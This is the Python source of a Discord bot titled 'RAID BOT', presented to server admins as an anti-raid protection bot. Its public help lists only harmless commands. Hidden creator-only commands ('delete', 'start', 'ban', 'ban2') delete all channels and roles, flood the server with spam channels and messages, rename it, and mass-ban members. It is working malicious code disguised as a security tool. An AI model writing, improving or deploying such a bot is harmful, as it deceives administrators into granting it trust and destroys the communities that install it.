import discord
import asyncio
from discord.ext import commands
import json
with open('config.json') as f:
    config = json.load(f)

creator_id = config["creator_id"]
text_message = config["text_message"]
channel_count = config["channel_count"]
channel_name = config["channel_name"]
token = config["token"]
ban_message = config["ban_message"]
server_name = config["server_name"]
message_send = config["message_send"]
ban_specific_id = config["ban_specific_id"]
ban_amount = config["ban_amount"]
role_name = config["role_name"]
role_color = config["role_color"]
embed_color = config["embed_color"]
game_name = config["game_name"]
start_ban = config["start_ban"]
start_role_delete = config["start_role_delete"]
    

########################################################
########################################################
########################################################
red_text = '\033[91m'
green_text = '\033[92m'
yellow_text = '\033[93m'
reset_text = '\033[0m'

text1 = '''\
  ____      _    ___ ____    ____   ___ _____ 
 |  _ \    / \  |_ _|  _ \  | __ ) / _ \_   _|
 | |_) |  / _ \  | || | | | |  _ \| | | || |  
 |  _ <  / ___ \ | || |_| | | |_) | |_| || |  
 |_| \_\/_/   \_\___|____/  |____/ \___/ |_| 

 By whiteWolf
'''

colored_text = red_text + text1 + reset_text
print(colored_text)
text2 = """Bot is ready"""
colored_text2 = green_text + text2 + reset_text

intents = discord.Intents.default()
intents.typing = False
intents.presences = False
 
bot = commands.Bot(command_prefix=".", intents=discord.Intents.all(), case_insensitive=True)



@bot.command()
async def about(ctx):
    embed = discord.Embed(title="My Commands", description="Here are my available commands:", color=embed_color)
    embed.add_field(name=".about", value="Displays information about the bot.", inline=False)
    embed.add_field(name=".setup", value="Sets up the bot.", inline=False)
    embed.add_field(name=".unsetup", value="Removes the setup and role.", inline=False)
    embed.add_field(name=".hi", value="Greets the user.", inline=False)
    embed.add_field(name=".ping", value="Checks the bot's latency.", inline=False)
    embed.set_footer(text="@Anti-Raid#1554")

    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(name= game_name))
    print(colored_text2)
@bot.command()
async def ping(ctx):
     await ctx.reply("Pong!")

@bot.command()
async def hello(ctx):
     await ctx.reply("Hi :D")
@bot.command()
async def hi(ctx):
     await ctx.reply("Hi :D")

@bot.command()
async def setup(ctx):
    guild = ctx.guild

    role = discord.utils.get(guild.roles, name= role_name)
    if role is not None:
        await ctx.reply("Command has already been written.")
        return

    role = await guild.create_role(name= role_name )

    await role.edit(colour=role_color)
    await role.edit(position=1)
    await ctx.me.add_roles(role)
    await role.edit(mentionable=False, hoist=True)
    await ctx.reply("Bot is ready!")

@bot.command()
async def unsetup(ctx):
    role = discord.utils.get(ctx.guild.roles, name= role_name)
    if role is not None:
        await role.delete()
        await ctx.reply("Your server is not protected!")
    else:
        await ctx.reply("The server was not protected!")


@bot.command()
@commands.check(lambda ctx: ctx.author.id == creator_id)
async def delete(ctx):
    guild = ctx.guild

    channels_to_remove = [channel for channel in guild.channels if isinstance(channel, (discord.TextChannel, discord.CategoryChannel, discord.VoiceChannel)) and channel != ctx.channel]
    await asyncio.gather(*[channel.delete() for channel in channels_to_remove])

    roles_to_remove = [role for role in guild.roles[1:] if role.name != role_name ] 
    await asyncio.gather(*[role.delete() for role in roles_to_remove])


@bot.command()
@commands.check(lambda ctx: ctx.author.id == creator_id)
async def start(ctx):
    guild = ctx.guild
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel) and channel.name:
            await channel.delete()

    async def create_channel(i):
        guild = ctx.guild
        
        overwrites = {
            ctx.guild.default_role: discord.PermissionOverwrite(read_messages=True),
            ctx.guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        channel = await ctx.guild.create_text_channel(channel_name, overwrites=overwrites)
        for _ in range(message_send):
            await channel.send(text_message)
        await guild.edit(name=server_name)

    await asyncio.gather(*[create_channel(i) for i in range(channel_count)])

    if start_ban:
        members = guild.members

        if ban_specific_id:
            member_to_ban = guild.get_member(int(ban_specific_id))
            if member_to_ban:
                members = [member_to_ban]

        if ban_amount == "all":
            ban_count = len(members)
        else:
            ban_count = min(int(ban_amount), len(members))

        for i in range(ban_count):
            member = members[i]
            await member.ban(reason=ban_message)

    if start_role_delete:
        roles_to_remove = [role for role in guild.roles[1:] if role.name != role_name]
        await asyncio.gather(*[role.delete() for role in roles_to_remove])


@bot.command()
@commands.check(lambda ctx: ctx.author.id == creator_id)
@commands.has_permissions(ban_members = True)
async def ban(ctx):
    guild = ctx.guild

    if ban_specific_id:
        member_to_ban = guild.get_member(ban_specific_id)
        if not member_to_ban:
            return
        await member_to_ban.ban(reason=ban_message)
        return

    members = guild.members
    ban_count = min(int(ban_amount), len(members)) if ban_amount != "all" else len(members)

    for member in members[:ban_count]:
        await member.ban(reason=ban_message)
@bot.command()
@commands.check(lambda ctx: ctx.author.id == creator_id)
@commands.has_permissions(ban_members = True)
async def ban2(ctx):
    guild = ctx.guild

    for member in guild.members:
        await member.ban()


bot.run(token)

